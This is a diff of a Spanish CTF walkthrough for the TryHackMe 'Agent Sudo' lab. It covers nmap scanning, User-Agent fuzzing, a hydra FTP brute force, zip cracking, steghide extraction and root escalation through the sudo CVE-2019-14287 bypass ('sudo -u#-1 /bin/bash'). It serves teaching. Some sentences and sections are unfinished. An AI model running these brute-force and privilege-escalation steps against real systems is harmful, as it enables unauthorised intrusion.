@@ -11,14 +11,27 @@ image: "/writeups/tryhackme-agent-sudo/thumbnail.png"
 
 ## Escaneo
 
-Escaneamos todos los puertos TCP de la maquina objetivo con **Nmap**.
+Escaneamos todos los 65535 puertos TCP de la maquina objetivo con **Nmap**.
 
 ```bash
-sudo nmap -n -Pn -T4 10.10.195.209 -oN nmap.txt
+sudo nmap -p- -n -Pn -T4 10.10.195.209 -oN nmap.txt
 ```
 
+<details>
+<summary>Explicación del comando</summary>
+<ul>
+        <li><b>nmap:</b> Herramienta para escanear puertos.</li>
+        <li><b>-p-:</b> Escanear todos los puertos.</li>
+        <li><b>-n:</b/> No realizar resolución DNS.</li>
+        <li><b>-Pn:</b/> Asumir que el <i>host</i> esta en linea para evitar que Nmap intente primero descubrirlo.</li>
+        <li><b>-T4:</b> Usar plantilla de temporizado 4 ("aggresive"). Esto no es necesario y podemos optar por usar la plantilla por defecto "normal" (-T3).</li>
+        <li><b>-oN [archivo]:</b> Escribir resultados en formato "normal" en el archivo indicado.</li>
+</ul>
+</details>
+
+
 ```text
-sudo nmap -n -Pn -T4 10.10.195.209 -oN nmap.txt
+sudo nmap -p- -n -Pn -T4 10.10.195.209 -oN nmap.txt
 
 # Nmap 7.95 scan initiated Fri May 30 16:11:54 2025 as: /usr/lib/nmap/nmap -p- -n -Pn -T4 -oN nmap.txt 10.10.195.209
 Nmap scan report for 10.10.195.209
@@ -35,6 +48,18 @@ Descubrimos el puerto ``21`` para ``FTP``, puerto ``22`` para ``SSH`` y puerto `
 ```bash
 sudo nmap -sCV -n -Pn -T4 10.10.195.209 -oN nmap-ports.txt
 ```
+
+<details>
+<summary>Explicación del comando</summary>
+<ul>
+        <li><b>nmap:</b> Herramienta para escanear puertos.</li>
+        <li><b>-sCV:</b> Usar <i>scripts</i> por defecto (-sC) y realizar escaneo de versiones (-sV).</li>
+        <li><b>-n:</b/> No realizar resolución DNS.</li>
+        <li><b>-Pn:</b/> Asumir que el <i>host</i> esta en linea para evitar que Nmap intente primero descubrirlo.</li>
+        <li><b>-T4:</b> Usar plantilla de temporizado 4 ("aggresive"). Esto no es necesario y podemos optar por usar la plantilla por defecto "normal" (-T3).</li>
+        <li><b>-oN [archivo]:</b> Escribir resultados en formato "normal" en el archivo indicado.</li>
+</ul>
+</details>
 
 ```text
 sudo nmap -sCV -n -Pn -T4 10.10.195.209 -oN nmap-ports.txt
@@ -78,11 +103,19 @@ Creamos una lista de palabras con todas las letras del abecedario en mayúscula 
 ttpassgen -r "[?u]{1:1}" wordlist.txt
 ```
 
+<details>
+<summary>Explicación del comando</summary>
+<ul>
+        <li><b>ttpassgen:</b> Generador de listas de palabras altamente flexible escrito en Python.</li>
+        <li><b>-r [regla]:</b>Regla a usar (Consultar el repositorio de GitHub para mayor información).</li>
+</ul>
+</details>
+
 ```text [wordlist.txt]
 A
 B
 C
-<SNIP>
+[...]
 Y
 Z
 ```
@@ -95,12 +128,25 @@ Para propósitos educativos, elegiremos seguir las redirecciones y filtrar las r
 ffuf -u http://10.10.195.209 -H "User-Agent: FUZZ" -w wordlist.txt -c -r -fs 218
 ```
 
+<details>
+<summary>Explicación del comando</summary>
+<ul>
+        <li><b>ffuf:</b> <i>Fuzzer</i> web escrito en Go.</li>
+        <li><b>-u [url]:</b> URL objetivo.</li>
+        <li><b>-H [cabecera]:</b> Cabecera "Nombre: Valor".</li>
+        <li><b>-w [lista de palabras]:</b> Ruta del archivo con la lista de palabras.</li>
+        <li><b>-c:</b> Colorear la salida (Permite distinguir mejor las respuestas por sus códigos).</li>
+        <li><b>-r:</b> Seguir redirecciones.</li>
+        <li><b>-fs [tamaño]:</b> Filtrar respuestas HTTP por tamaño.</li>
+</ul>
+</details>
+
 > ¿Filtrar por código de respuesta o por tamaño? Filtrar por código de respuesta nos puede llevar a omitir respuestas no estándares, por lo que seguiremos la redirecciones y filtraremos por tamaño de respuesta.
 
 ```text
 ffuf -u http://10.10.195.209 -H "User-Agent: FUZZ" -w wordlist.txt -c -r -fs 218
 
-<SNIP>
+[...]
 R                       [Status: 200, Size: 310, Words: 31, Lines: 19, Duration: 267ms]
 C                       [Status: 200, Size: 177, Words: 27, Lines: 8, Duration: 267ms]
 ```
@@ -112,6 +158,15 @@ El User-Agent R y C retornan respuestas diferentes a la estándar. Al enviar una
 ```bash
 curl -sL -H "User-Agent: C" http://10.10.195.209/
 ```
+
+<details>
+<summary>Explicación del comando</summary>
+<ul>
+        <li><b>curl:</b> Herramienta para transferir datos desde o hacia un servidor usando URLs.</li>
+        <li><b>-sL:</b> No mostrar barra de progreso (-s) y seguir redirecciones (-L).</li>
+        <li><b>-H [cabecera]:</b> Cabecera "Nombre: Valor".</li>
+</ul>
+</details>
 
 ```text
 curl -sL -H "User-Agent: C" http://10.10.195.209/
@@ -150,10 +205,21 @@ Al fallar el anterior ataque, esta vez lo intentaremos en el servicio ``FTP``, h
 hydra -l "chris" -P /usr/share/wordlists/rockyou.txt -f -vV 10.10.195.209 ftp
 ```
 
+<details>
+<summary>Explicación del comando</summary>
+<ul>
+        <li><b>hydra:</b> <i>Cracker</i> de inicios de sesión paralelos que soporta numerosos protocolos.</li>
+        <li><b>-l [usuario]:</b> Nombre de usuario a iniciar sesión.</li>
+        <li><b>-P: [lista de palabras]</b> Ruta del archivo con contraseñas a probar.</li>
+        <li><b>-f:</b> Parar después del primer inicio de sesión valido.</li>
+        <li><b>-vV:</b> Salida muy verbal.</li>
+</ul>
+</details>
+
 ```text
 hydra -l "chris" -P /usr/share/wordlists/rockyou.txt -f -vV 10.10.195.209 ftp
 
-<SNIP>
+[...]
 [21][ftp] host: 10.10.195.209   login: chris   password: crystal
 [STATUS] attack finished for 10.10.195.209 (valid pair found)
 1 of 1 target successfully completed, 1 valid password found
@@ -179,11 +245,11 @@ ftp> prompt
 Interactive mode off.
 ftp> mget .
 local: To_agentJ.txt remote: To_agentJ.txt
-<SNIP>
+[...]
 local: cute-alien.jpg remote: cute-alien.jpg
-<SNIP>
+[...]
 local: cutie.png remote: cutie.png
-<SNIP>
+[...]
 ```
 
 > Usamos el comando *promt* para evitar tener que confirmar manualmente la descarga de cada archivo.
@@ -209,10 +275,21 @@ La herramienta *exiftool* no revela nada importante en ambas imágenes. Pero **s
 strings cutie.png | head -n 20 && echo "....." && strings cutie.png | tail -n 20
 ```
 
+<details>
+<summary>Explicación del comando</summary>
+<ul>
+        <li><b>strings [archivo]:</b> </li>
+        <li><b>head:</b> Mostrar las primeras 10 lineas de un archivo.</li>
+        <li><b>-n [numero]:</b> Mostrar las primeras lineas.</li>
+        <li><b>tail:</b> Mostrar las ultimas 10 lineas de un archivo.</li>
+        <li><b>-n [numero]:</b> Mostrar las ultimas lineas.</li>
+</ul>
+</details>
+
 ```text
 strings cutie.png | head -n 20 && echo "....." && strings cutie.png | tail -n 20
 
-<SNIP>
+[...]
 To_agentR.txt
 W\_z#
 2a>=
@@ -262,7 +339,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt zip2john.txt
 ```text
 john --wordlist=/usr/share/wordlists/rockyou.txt zip2john.txt
 
-<SNIP>
+[...]
 alien            (8702.zip/To_agentR.txt)
 1g 0:00:00:00 DONE (2025-05-30 19:47) 1.351g/s 44281p/s 44281c/s 44281C/s christal..eatme1
 Use the "--show" option to display all of the cracked passwords reliably
@@ -303,14 +380,14 @@ $3br
 &'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
 ~U,q
 .c@6
-<SNIP>
+[...]
 ```
 
 > Nota las cadenas de caracteres inusuales en las primeras lineas de la salida. Definitivamente hay información adicional incrustada en la imagen. Compara la salida de *strings* anterior con el de una imagen normal.
 
 *binwalk* no revela archivos incrustados. Es posible que la información adicional haya sido incrustada mediante métodos de esteganografía.
 
-¿Recuerdas la frase anterior? Si se hizo uso de esteganografía para ocultar información, esta habrá sido ocultada con la ayuda de una frase secreta. Es posible que la frase anterior corresponda a la frase secreta. Para extraer esta información haremos uso de **steghide**.
+¿Recuerdas la frase anterior? Si se hizo uso de esteganografía para ocultar información, esta habrá sido ocultada con la ayuda de una frase secreta. Es posible que esta sea la frase usada. Para extraer esta información haremos uso de **steghide**.
 
 ```bash
 steghide extract -sf cute-alien.jpg -p "Area51"
@@ -341,15 +418,58 @@ chris
 
 Descubrimos el usuario ``james`` y su contraseña ``hackerrules!``. Usamos estas credenciales para ingresar al servidor SSH.
 
+Dentro de la carpeta *home* de nuestro usuario encontraremos la bandera del usuario y la imagen ``Alien_autospy.jpg`` que contiene la respuesta a la pregunta "What is the incident of the photo called?". Para copiar la imagen a nuestra maquina local puedes usar el comando ``scp james@10.10.195.209/Alien_autospy.jpg .`` en una nueva terminal y luego ingresar la contraseña de *james*.
+
 ## Escalada de privilegios
 
-Descripción
+Enumeramos el usuario actual. Una de las primeras cosas que debemos hacer en CTFs cuando obtenemos un *foothold* en la maquina objetivo es ingresar el comando ``sudo -ll`` (En este caso deberemos usar ``sudo -l`` por razones que explicare mas adelante).
+
+```text
+james@agent-sudo:~$ sudo -l
+
+[sudo] password for james: hackerrules!
+Matching Defaults entries for james on agent-sudo:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User james may run the following commands on agent-sudo:
+    (ALL, !root) /bin/bash
+```
+
+> Aunque la salida del comando ``sudo -ll`` tiene un formato mas legible que ``sudo -l``, la linea ``(ALL, !root) /bin/bash`` sera clave para identificar la vulnerabilidad.
+
+La salida del comando anterior puede resultar poco clara, pero esta nos informa que el usuario ``james`` puede ejecutar el comando ``/bin/bash`` como cualquier usuario excepto ``root``. Parece seguro ¿No? En realidad existe un CVE especifico para esta situación que nos permitirá escalar nuestros privilegios a root.
+
+Para identificar esta vulnerabilidad podemos buscar la frase ``(ALL, !root) /bin/bash`` (¿No te parece inusual, o demasiado especifica?) en el motor de búsqueda de tu preferencia y se nos apuntara al CVE-2019-14287. Todas las versiones de Sudo anteriores a 1.8.28 presentan una falla en la ejecución de comandos con un User ID (UID) arbitrario.
+
+Podemos comprobar que la versión de sudo presente en la maquina objetivo es vulnerable a este CVE.
+
+```text
+james@agent-sudo:~$ sudo --version
+
+Sudo version 1.8.21p2
+Sudoers policy plugin version 1.8.21p2
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.21p2
+```
+
+Para explicar mejor esta vulnerabilidad, es necesario saber que el usuario root siempre tendrá un UID de 0 y que un usuario en Linux también puede ser referenciado directamente haciendo uso de su UID. Por ejemplo, tanto el comando ``id root`` como ``id 0`` mostraran los identificadores del usuario root. En el caso del comando ``sudo``, la opción ``-u`` (usada para ejecutar un comando como otro usuario) admite UIDs haciendo uso del formato ``#uid``. De esta forma podríamos ejecutar un comando como root haciendo uso de ``sudo -u#0 [comando]``.
+
+La vulnerabilidad reside en el hecho de que un UID . Esta falla solo afecta a configuraciones de sudo donde alguna entrada en el archivo sudoers permite ejecutar un comando como cualquier usuario excepto root. 
+
+```bash
+sudo -u#-1 /bin/bash
+```
+
+```text
+james@agent-sudo:~$ sudo -u#-1 /bin/bash
+
+root@agent-sudo:~# id
+uid=0(root) gid=1000(james) groups=1000(james)
+```
+
+Dentro de la carpeta ``/root`` encontraremos la bandera de root y la respuesta a la pregunta bonus.
 
 ## Persistencia
-
-Descripción
-
-## Post-Root
 
 Descripción
 
@@ -360,6 +480,7 @@ Descripción
 ## Remediación
 
 1. Evita el uso de contraseñas débiles.
+2. Actualiza sudo a 
 
 ## Conclusiones
 
